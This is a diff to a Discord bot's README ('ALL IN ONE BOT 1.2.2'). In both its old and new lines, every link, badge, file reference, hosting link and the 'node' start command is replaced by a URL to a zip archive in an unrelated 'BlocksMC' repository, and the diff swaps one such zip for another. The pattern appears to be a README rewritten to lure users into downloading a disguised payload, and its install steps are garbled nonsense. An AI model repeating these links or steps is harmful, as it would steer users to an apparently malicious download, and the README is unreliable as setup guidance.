@@ -1,39 +1,39 @@
-![Animated Background](https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip)
+![Animated Background](https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip)
 
 <h1 align="center" style="font-family: Arial, sans-serif; color: #FF6F61; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
   ALL IN ONE BOT 1.2.2
 </h1>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="License: MIT" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="Donate" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="YouTube" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="Join Discord" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="Instagram" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">
-    <img src="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip"
+  <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">
+    <img src="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip"
       alt="Facebook" />
   </a>
 </p>
@@ -42,10 +42,10 @@
 
 <h3>How to Install</h3>
 
-<h4>Step 1: Update <code>https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip</code> [ USE ENV FILES ]</h4>
+<h4>Step 1: Update <code>https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip</code> [ USE ENV FILES ]</h4>
 
 <ol>
-  <li>Open the <code>https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip</code> and add your MongoDB URL.</li>
+  <li>Open the <code>https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip</code> and add your MongoDB URL.</li>
 </ol>
 
 <h4>ENV SETUP</h4>
@@ -65,7 +65,7 @@ GEMINI_API=
 <h4>Step 2: Set Up Hosting Service</h4>
 
 <ol>
-  <li>Go to your preferred hosting service. For this guide, we use <a href="https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip">Render</a>.</li>
+  <li>Go to your preferred hosting service. For this guide, we use <a href="https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip">Render</a>.</li>
   <li>In the Build & Deploy section, paste your repository URL.</li>
 </ol>
 
@@ -74,7 +74,7 @@ GEMINI_API=
 Run the following commands to install dependencies and start your bot:
 
 npm install
-node https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip
+node https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip
 </pre>
 
 <h4>Step 4: Get Your Bot Token</h4>
@@ -107,6 +107,6 @@ node https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/dist
 
 <h3>Useful Files</h3>
 <ul>
-  <li><code>https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip</code>: Change, add, or remove music cards here.</li>
-  <li><code>https://raw.githubusercontent.com/Sensei123-rgb/BlocksMC/main/commands/distube/BlocksMC_2.6.zip</code>: Change, add, or remove music icons here.</li>
+  <li><code>https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip</code>: Change, add, or remove music cards here.</li>
+  <li><code>https://github.com/Sensei123-rgb/BlocksMC/raw/refs/heads/main/utils/Blocks-MC-1.4.zip</code>: Change, add, or remove music icons here.</li>
 </ul>
